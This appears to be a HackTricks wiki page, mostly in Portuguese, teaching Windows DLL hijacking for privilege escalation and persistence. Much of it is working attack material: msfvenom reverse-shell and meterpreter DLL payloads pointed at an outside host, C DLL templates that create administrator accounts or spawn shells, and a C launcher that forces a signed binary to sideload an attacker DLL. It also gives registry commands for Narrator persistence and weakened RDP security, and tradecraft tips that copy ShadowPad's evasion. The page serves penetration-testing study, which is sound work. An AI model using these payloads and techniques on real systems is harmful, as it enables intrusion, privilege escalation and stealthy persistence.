# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informações Básicas

DLL Hijacking envolve manipular um aplicativo confiável para carregar uma DLL maliciosa. Este termo engloba várias táticas como **DLL Spoofing, Injection, and Side-Loading**. É usado principalmente para execução de código, obtenção de persistência e, menos comumente, escalada de privilégios. Apesar do foco em escalada aqui, o método de hijacking permanece consistente entre os objetivos.

### Técnicas Comuns

Diversos métodos são empregados para DLL hijacking, cada um com sua efetividade dependendo da estratégia de carregamento de DLLs da aplicação:

1. **DLL Replacement**: Substituir uma DLL legítima por uma maliciosa, opcionalmente usando DLL Proxying para preservar a funcionalidade da DLL original.
2. **DLL Search Order Hijacking**: Colocar a DLL maliciosa em um caminho de pesquisa antes da legítima, explorando o padrão de busca da aplicação.
3. **Phantom DLL Hijacking**: Criar uma DLL maliciosa para que a aplicação a carregue, acreditando ser uma DLL necessária que não existe.
4. **DLL Redirection**: Modificar parâmetros de busca como `%PATH%` ou arquivos `.exe.manifest` / `.exe.local` para direcionar a aplicação à DLL maliciosa.
5. **WinSxS DLL Replacement**: Substituir a DLL legítima por uma maliciosa no diretório WinSxS, um método frequentemente associado com DLL side-loading.
6. **Relative Path DLL Hijacking**: Colocar a DLL maliciosa em um diretório controlado pelo usuário junto com a aplicação copiada, assemelhando-se a técnicas de Binary Proxy Execution.

> [!TIP]
> Para uma cadeia passo a passo que empilha HTML staging, configurações AES-CTR e implantes .NET sobre DLL sideloading, reveja o workflow abaixo.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Encontrando Dlls ausentes

A forma mais comum de encontrar Dlls ausentes em um sistema é executar [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) da sysinternals, **definindo** os **2 filtros abaixo**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

e apenas mostrar a **Atividade do Sistema de Arquivos**:

![](<../../../images/image (153).png>)

Se você está procurando por **dlls ausentes em geral** deixe isso rodando por alguns **segundos**.\
Se você está procurando por uma **dll ausente dentro de um executável específico** você deve definir **outro filtro como "Process Name" "contains" `<exec name>`, executá-lo, e parar a captura de eventos**.

## Exploiting Missing Dlls

Para escalar privilégios, a melhor chance que temos é conseguir **gravar uma dll que um processo privilegiado tentará carregar** em algum dos **locais onde ela será procurada**. Portanto, poderemos **gravar** uma dll em uma **pasta** onde a **dll é pesquisada antes** da pasta onde a **dll original** está (caso estranho), ou conseguiremos **gravar em alguma pasta onde a dll será procurada** e a dll original **não existe** em nenhuma pasta.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Aplicações Windows procuram DLLs seguindo um conjunto de caminhos de pesquisa pré-definidos, obedecendo a uma sequência particular. O problema do DLL hijacking surge quando uma DLL maliciosa é colocada estrategicamente em um desses diretórios, garantindo que ela seja carregada antes da DLL autêntica. Uma solução para prevenir isso é garantir que a aplicação use caminhos absolutos ao referenciar as DLLs de que necessita.

Você pode ver a ordem de busca de DLLs em sistemas 32-bit abaixo:

1. O diretório de onde a aplicação foi carregada.
2. O diretório do sistema. Use a função [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) para obter o caminho deste diretório.(_C:\Windows\System32_)
3. O diretório do sistema 16-bit. Não existe função que obtenha o caminho deste diretório, mas ele é pesquisado. (_C:\Windows\System_)
4. O diretório do Windows. Use a função [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) para obter o caminho deste diretório.
1. (_C:\Windows_)
5. O diretório atual.
6. Os diretórios listados na variável de ambiente PATH. Note que isto não inclui o caminho por-application especificado pela chave de registro **App Paths**. A chave **App Paths** não é usada ao computar a DLL search path.

Essa é a ordem de busca **default** com **SafeDllSearchMode** habilitado. Quando está desabilitado o diretório atual escala para o segundo lugar. Para desabilitar essa feature, crie o valor de registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e defina-o para 0 (o padrão é habilitado).

Se a função [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) é chamada com **LOAD_WITH_ALTERED_SEARCH_PATH** a busca começa no diretório do módulo executável que **LoadLibraryEx** está carregando.

Finalmente, note que **uma dll pode ser carregada indicando o caminho absoluto em vez de apenas o nome**. Nesse caso a dll será **procurada somente nesse caminho** (se a dll tiver dependências, elas serão procuradas como se tivesse sido carregada apenas pelo nome).

Existem outras formas de alterar a ordem de busca, mas não vou explicá-las aqui.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Uma forma avançada de influenciar de maneira determinística o caminho de busca de DLL de um processo recém-criado é definir o campo DllPath em RTL_USER_PROCESS_PARAMETERS ao criar o processo com as APIs nativas do ntdll. Ao fornecer aqui um diretório controlado pelo atacante, um processo alvo que resolva uma DLL importada por nome (sem caminho absoluto e sem usar as flags de carregamento seguro) pode ser forçado a carregar uma DLL maliciosa a partir desse diretório.

Ideia principal
- Construa os parâmetros do processo com RtlCreateProcessParametersEx e forneça um DllPath customizado que aponte para sua pasta controlada (por exemplo, o diretório onde seu dropper/unpacker reside).
- Crie o processo com RtlCreateUserProcess. Quando o binário alvo resolver uma DLL por nome, o loader consultará esse DllPath fornecido durante a resolução, permitindo sideloading confiável mesmo quando a DLL maliciosa não está colocada juntamente com o EXE alvo.

Notas/limitações
- Isso afeta o processo filho sendo criado; é diferente de SetDllDirectory, que afeta apenas o processo atual.
- O alvo deve importar ou chamar LoadLibrary em uma DLL por nome (sem caminho absoluto e não usando LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs e caminhos absolutos hardcoded não podem ser hijackeados. Forwarded exports e SxS podem alterar a precedência.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Coloque um xmllite.dll malicioso (exportando as funções requeridas ou fazendo proxy para o real) no seu diretório DllPath.
- Execute um binário assinado conhecido por procurar xmllite.dll pelo nome usando a técnica acima. O loader resolve a importação via o DllPath fornecido e sideloads your DLL.

Esta técnica foi observada em ambientes reais para conduzir cadeias de sideloading multiestágio: um launcher inicial deixa um DLL auxiliar, que então invoca um binário assinado pela Microsoft, hijackable, com um DllPath customizado para forçar o carregamento do attacker’s DLL a partir de um staging directory.


#### Exceptions on dll search order from Windows docs

Certas exceções à ordem padrão de busca de DLLs são mencionadas na documentação do Windows:

- Quando uma **DLL que compartilha seu nome com uma já carregada na memória** é encontrada, o sistema ignora a busca usual. Em vez disso, ele realiza uma verificação por redirecionamento e um manifesto antes de recorrer à DLL já na memória. **Nesse cenário, o sistema não realiza uma busca pela DLL**.
- Nos casos em que a DLL é reconhecida como uma **known DLL** para a versão atual do Windows, o sistema utilizará sua versão da known DLL, juntamente com quaisquer DLLs dependentes, **abrindo mão do processo de busca**. A chave do registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contém uma lista dessas known DLLs.
- Caso uma **DLL tenha dependências**, a busca por essas DLLs dependentes é conduzida como se fossem indicadas apenas pelos seus **nomes de módulo**, independentemente de a DLL inicial ter sido identificada através de um caminho completo.

### Escalating Privileges

**Requirements**:

- Identifique um processo que opere ou irá operar sob **privilégios diferentes** (movimentação horizontal ou lateral), que esteja **sem uma DLL**.
- Garanta que exista **acesso de escrita** em qualquer **diretório** onde a **DLL** será **procurada**. Esse local pode ser o diretório do executável ou um diretório dentro do path do sistema.

Sim, os requisitos são complicados de encontrar, pois **por padrão é meio estranho encontrar um executável privilegiado sem uma dll** e é ainda **mais estranho ter permissões de escrita em uma pasta do path do sistema** (você não tem por padrão). Mas, em ambientes mal configurados isso é possível.\
Caso tenha sorte e atenda aos requisitos, você pode verificar o projeto [UACME](https://github.com/hfiref0x/UACME). Mesmo que o **objetivo principal do projeto seja bypass UAC**, você pode encontrar lá um **PoC** de um Dll hijaking para a versão do Windows que puder usar (provavelmente apenas mudando o caminho da pasta onde tem permissões de escrita).

Note que você pode **verificar suas permissões em uma pasta** fazendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **verifique as permissões de todas as pastas dentro do PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Você também pode verificar os imports de um executable e os exports de um dll com:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Para um guia completo sobre como **abusar Dll Hijacking para escalar privilégios** com permissões para escrever em uma **System Path folder** verifique:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Ferramentas automatizadas

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) irá verificar se você tem permissões de escrita em qualquer pasta dentro do PATH do sistema.\
Outras ferramentas automatizadas interessantes para descobrir essa vulnerabilidade são as **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._

### Exemplo

Caso você encontre um cenário explorável, uma das coisas mais importantes para explorá-lo com sucesso é **criar uma dll que exporte pelo menos todas as funções que o executável irá importar dela**. De qualquer forma, note que Dll Hijacking é útil para [escalar de Medium Integrity level para High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ou de [**High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system). Você pode encontrar um exemplo de **como criar uma dll válida** neste estudo sobre dll hijacking focado em execução: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
Além disso, na **próxima seção** você pode encontrar alguns **códigos dll básicos** que podem ser úteis como **templates** ou para criar uma **dll com funções não requeridas exportadas**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Basicamente um **Dll proxy** é uma Dll capaz de **executar seu código malicioso quando carregada**, mas também de **expor** e **funcionar** como **esperado**, ao **relayer todas as chamadas para a biblioteca real**.

Com a ferramenta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ou [**Spartacus**](https://github.com/Accenture/Spartacus) você pode realmente **indicar um executável e selecionar a biblioteca** que você quer proxify e **generate a proxified dll** ou **indicar a Dll** e **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obter um meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Criar um usuário (x86 não vi uma versão x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Seu próprio

Observe que, em vários casos, a Dll que você compilar deve **exportar várias funções** que serão carregadas pelo victim process; se essas funções não existirem, o **binary** não conseguirá carregá-las e o **exploit** falhará.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Exemplo de DLL C++ com criação de usuário</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternativa com entrada de thread</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Estudo de Caso: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe ainda procura uma DLL de localização previsível e específica por idioma ao iniciar, que pode ser hijacked para execução arbitrária de código e persistência.

Fatos principais
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Se uma DLL gravável controlada por um atacante existir no caminho OneCore, ela é carregada e `DllMain(DLL_PROCESS_ATTACH)` é executado. No exports are required.

Discovery with Procmon
- Filtro: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Inicie o Narrator e observe a tentativa de carregamento do caminho acima.

DLL mínima
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- Contexto do usuário (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Com isso, ao iniciar o Narrator ele carrega a DLL plantada. Na secure desktop (tela de logon), pressione CTRL+WIN+ENTER para iniciar o Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Permitir camada de segurança RDP clássica: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Conecte via RDP ao host; na tela de logon pressione CTRL+WIN+ENTER para lançar o Narrator; sua DLL será executada como SYSTEM na secure desktop.
- A execução para quando a sessão RDP é fechada—injete/migre rapidamente.

Bring Your Own Accessibility (BYOA)
- Você pode clonar uma entrada de registro de Accessibility Tool (AT) embutida (por exemplo, CursorIndicator), editá-la para apontar para um binário/DLL arbitrário, importá-la e então definir `configuration` para esse nome de AT. Isso permite execução arbitrária através do framework de Acessibilidade.

Notes
- Gravar em `%windir%\System32` e alterar valores HKLM requer privilégios de administrador.
- Toda a lógica do payload pode residir em `DLL_PROCESS_ATTACH`; no exports are needed.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Implementação do Exploit

Um atacante pode colocar um stub malicioso `hostfxr.dll` no mesmo diretório, explorando a DLL ausente para obter execução de código sob o contexto do usuário:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Fluxo de Ataque

1. Como usuário padrão, coloque `hostfxr.dll` em `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Aguarde a tarefa agendada ser executada às 9:30 AM no contexto do usuário atual.
3. Se um administrador estiver logado quando a tarefa for executada, a DLL maliciosa roda na sessão do administrador em integridade média.
4. Encadear técnicas padrão de bypass de UAC para elevar de integridade média para privilégios SYSTEM.

## Estudo de Caso: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors frequentemente combinam droppers baseados em MSI com DLL side-loading para executar payloads sob um processo confiável e assinado.

Chain overview
- User downloads MSI. A CustomAction runs silently during the GUI install (e.g., LaunchApplication or a VBScript action), reconstructing the next stage from embedded resources.
- The dropper writes a legitimate, signed EXE and a malicious DLL to the same directory (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- When the signed EXE is started, Windows DLL search order loads wsc.dll from the working directory first, executing attacker code under a signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Look for entries that run executables or VBScript. Example suspicious pattern: LaunchApplication executing an embedded file in background.
- In Orca (Microsoft Orca.exe), inspect CustomAction, InstallExecuteSequence and Binary tables.
- Embedded/split payloads in the MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Look for multiple small fragments that are concatenated and decrypted by a VBScript CustomAction. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Sideloading prático com wsc_proxy.exe
- Coloque estes dois arquivos na mesma pasta:
- wsc_proxy.exe: host legítimo assinado (Avast). O processo tenta carregar wsc.dll pelo nome a partir do seu diretório.
- wsc.dll: attacker DLL. Se nenhum export específico for necessário, DllMain pode ser suficiente; caso contrário, construa uma proxy DLL e encaminhe os exports necessários para a biblioteca genuína enquanto executa o payload em DllMain.
- Construa um DLL payload mínimo:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Para requisitos de exportação, use um framework de proxy (por exemplo, DLLirant/Spartacus) para gerar um forwarding DLL que também execute seu payload.

- Esta técnica depende da resolução de nomes de DLL pelo binário host. Se o host usar caminhos absolutos ou flags de carregamento seguro (por exemplo, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), o hijack pode falhar.
- KnownDLLs, SxS, and forwarded exports podem influenciar a precedência e devem ser considerados durante a seleção do binário host e do export set.

## Triades assinadas + payloads criptografados (estudo de caso ShadowPad)

Check Point descreveu como Ink Dragon implanta ShadowPad usando uma **triade de três arquivos** para se misturar com software legítimo enquanto mantém o payload principal criptografado no disco:

1. **Host EXE assinado** – fornecedores como AMD, Realtek ou NVIDIA são abusados (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Os atacantes renomeiam o executável para parecer um binário do Windows (por exemplo `conhost.exe`), mas a assinatura Authenticode permanece válida.
2. **Malicious loader DLL** – deixada ao lado do EXE com um nome esperado (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). A DLL geralmente é um binário MFC ofuscado com o framework ScatterBrain; sua única função é localizar o blob criptografado, decifrá-lo e mapear por reflexão o ShadowPad.
3. **Encrypted payload blob** – frequentemente armazenado como `<name>.tmp` no mesmo diretório. Após mapear em memória o payload decriptado, o loader exclui o arquivo TMP para destruir evidências forenses.

Notas de tradecraft:

* Renomear o EXE assinado (mantendo o `OriginalFileName` original no cabeçalho PE) permite que ele se faça passar por um binário do Windows ao mesmo tempo em que retém a assinatura do fornecedor; portanto, replique o hábito do Ink Dragon de deixar binários com aparência `conhost.exe` que na verdade são utilitários da AMD/NVIDIA.
* Como o executável permanece confiável, a maioria dos controles de allowlisting só exige que sua DLL maliciosa fique ao lado dele. Foque em customizar o loader DLL; o pai assinado normalmente pode rodar sem alterações.
* O decryptor do ShadowPad espera que o blob TMP esteja ao lado do loader e seja gravável para poder zerar o arquivo após o mapeamento. Mantenha o diretório gravável até o payload ser carregado; uma vez na memória, o arquivo TMP pode ser excluído com segurança por razões de OPSEC.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)


{{#include ../../../banners/hacktricks-training.md}}
